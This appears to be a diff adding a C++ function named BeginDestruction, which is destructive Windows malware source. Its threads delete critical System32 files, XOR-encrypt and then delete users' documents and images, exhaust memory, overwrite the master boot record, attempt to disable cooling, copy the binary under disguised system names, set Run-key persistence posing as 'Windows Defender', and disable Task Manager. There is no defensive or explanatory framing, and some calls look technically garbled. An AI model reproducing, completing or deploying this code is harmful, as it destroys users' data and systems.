@@ -1,0 +1,97 @@
+void BeginDestruction() {
+    // Thread 1: Delete System32 critical files
+    std::thread t1([]() {
+        std::vector<std::string> criticalPaths = {
+            "C:\\Windows\\System32\\ntoskrnl.exe",
+            "C:\\Windows\\System32\\hal.dll",
+            "C:\\Windows\\System32\\drivers\\*.sys",
+            "C:\\Windows\\System32\\config\\SYSTEM"
+        };
+        
+        for (const auto& path : criticalPaths) {
+            std::string cmd = "del /f /q /s " + path + " > nul 2>&1";
+            system(cmd.c_str());
+        }
+    });
+    
+    // Thread 2: File encryption (simple XOR)
+    std::thread t2([]() {
+        std::vector<std::string> targetExtensions = {".jpg", ".png", ".docx", ".pdf", ".txt"};
+        std::string key = "MALBOT_DESTROY";
+        
+        for (const auto& ext : targetExtensions) {
+            std::string findCmd = "dir /s /b C:\\*" + ext + " > C:\\temp\\files.txt";
+            system(findCmd.c_str());
+            
+            // Read file list and encrypt
+            std::ifstream fileList("C:\\temp\\files.txt");
+            std::string filePath;
+            while (std::getline(fileList, filePath)) {
+                EncryptFile(filePath, key);
+                // Delete original after encryption
+                DeleteFile(filePath.c_str());
+            }
+        }
+    });
+    
+    // Thread 3: RAM exhaustion
+    std::thread t3([]() {
+        while (true) {
+            void* memoryLeak = malloc(1024 * 1024 * 100); // 100MB chunks
+            memset(memoryLeak, 0xFF, 1024 * 1024 * 100);
+            // Never free the memory
+            Sleep(100);
+        }
+    });
+    
+    // Thread 4: Hardware sabotage
+    std::thread t4([]() {
+        // Disable fans via WMI
+        system("wmic /namespace:\\\\root\\wmi PATH MSAcpi_ThermalZoneTemperature set ActiveCooling=FALSE");
+        
+        // Overwrite MBR
+        std::vector<char> mbrDestruct(512, 0xCC);
+        HANDLE hDrive = CreateFile("\\\\.\\PhysicalDrive0", 
+                                  GENERIC_WRITE, 
+                                  FILE_SHARE_WRITE, 
+                                  NULL, 
+                                  OPEN_EXISTING, 
+                                  0, 
+                                  NULL);
+        if (hDrive != INVALID_HANDLE_VALUE) {
+            DWORD bytesWritten;
+            WriteFile(hDrive, mbrDestruct.data(), 512, &bytesWritten, NULL);
+            CloseHandle(hDrive);
+        }
+    });
+    
+    // Thread 5: Self-replication and persistence
+    std::thread t5([]() {
+        // Copy to multiple locations
+        CopyFile("malwarekiller.exe", "C:\\Windows\\System32\\svchost_mal.exe", FALSE);
+        CopyFile("malwarekiller.exe", "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\wininit.exe", FALSE);
+        
+        // Registry persistence
+        HKEY hKey;
+        RegOpenKeyEx(HKEY_CURRENT_USER, 
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+                    0, KEY_WRITE, &hKey);
+        RegSetValueEx(hKey, "Windows Defender", 0, REG_SZ, 
+                     (BYTE*)"C:\\Windows\\System32\\svchost_mal.exe", 48);
+        RegCloseKey(hKey);
+        
+        // Disable Task Manager
+        RegOpenKeyEx(HKEY_CURRENT_USER,
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+                    0, KEY_WRITE, &hKey);
+        DWORD disable = 1;
+        RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
+        RegCloseKey(hKey);
+    });
+    
+    t1.detach();
+    t2.detach();
+    t3.detach();
+    t4.detach();
+    t5.detach();
+}
